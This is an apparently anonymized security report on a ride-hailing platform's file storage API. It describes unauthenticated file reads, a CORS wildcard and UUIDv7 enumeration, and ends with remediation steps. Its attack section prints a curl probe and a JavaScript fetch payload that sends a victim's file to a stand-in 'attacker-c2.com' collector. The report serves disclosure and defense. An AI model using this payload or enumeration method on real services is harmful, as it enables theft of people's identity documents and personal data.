---
title: Complete Data Exposure via File Storage API & CORS Wildcard
target: International Ride-Hailing Platform
category: Cloud & Storage Security
severity: Critical
cvss: 9.1
tags: [cloud, s3, cors, idor, pii-leak]
date: 2026-03-10
---

# ☁️ File Storage API Data Exposure & CORS Wildcard (Anonymized)

> ⚠️ **Context:** Discovered during security evaluation of a global transport/ride-hailing platform.  
> 🛡️ **Confidentiality:** Target organization anonymized as **"International Ride-Hailing Platform"**. All specific subdomains, file UUIDs, and infrastructure hosts are **[REDACTED]**.

---

## 🎯 Target Scope
- **Organization Type:** International Ride-Hailing & Logistics Platform
- **Component:** Central Cloud File Storage Service Mesh (`istio-envoy` + CloudFront CDN)
- **Affected Endpoints:**  
  - `GET /api/v1/files/{uuid}`
  - `GET /api/v2/files/{uuid}`

---

## ⚠️ Impact Summary
- **Severity:** Critical (CVSS 9.1 - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`)
- **Impact:** Unrestricted exfiltration of sensitive platform files including driver licenses, identity documents, receipts, and user attachments.
- **Root Cause:** Two compounding vulnerabilities:
  1. Complete lack of authentication on file read operations (IDOR).
  2. Overly permissive CORS header `Access-Control-Allow-Origin: *` enabling zero-interaction cross-origin scraping via any arbitrary website.

---

## 🔍 Attack Vector & Technical Details

### 1. Unauthenticated Object Retrieval
Any client could request files directly via UUID without providing cookies, bearer tokens, or API keys:
```bash
curl -s -I "https://file-storage.[redacted-ridehailing].com/api/v1/files/[UUID-REDACTED]"
```
**Response:**
```http
HTTP/1.1 200 OK
Content-Type: image/jpeg
Content-Length: 864778
Access-Control-Allow-Origin: *
```

### 2. Cross-Origin Wildcard Exploitation
Because `Access-Control-Allow-Origin: *` was returned on the file storage endpoint, an adversary could embed a lightweight script on an external website:
```javascript
// Malicious Cross-Origin Fetch Payload
fetch("https://file-storage.[redacted-ridehailing].com/api/v1/files/[UUID-REDACTED]")
  .then(response => response.blob())
  .then(blob => {
    const formData = new FormData();
    formData.append("exfiltrated_file", blob);
    fetch("https://attacker-c2.com/collector", { method: "POST", body: formData });
  });
```
When a victim visited the malicious site, the script could read files from the file storage backend without triggering browser security blocks.

### 3. Predictable Identifier Structure (UUIDv7)
Analysis of discovered identifiers revealed the use of **UUIDv7**, where the first 48 bits encode a sequential Unix timestamp in milliseconds. This significantly reduced entropy for targeted enumeration around known transaction windows.

---

## 🛡️ Remediation
1. **Enforce Authentication on Read Endpoints:** Require valid user authorization claims before returning file streams.
2. **Eliminate Permissive CORS Wildcards:** Restrict `Access-Control-Allow-Origin` strictly to verified first-party domains.
3. **Pre-Signed URL Architecture:** Transition document downloads to short-lived (15-minute TTL) HMAC-signed URLs generated server-side.
4. **Bucket-Level Isolation:** Ensure backend object storage policies deny unauthenticated access.
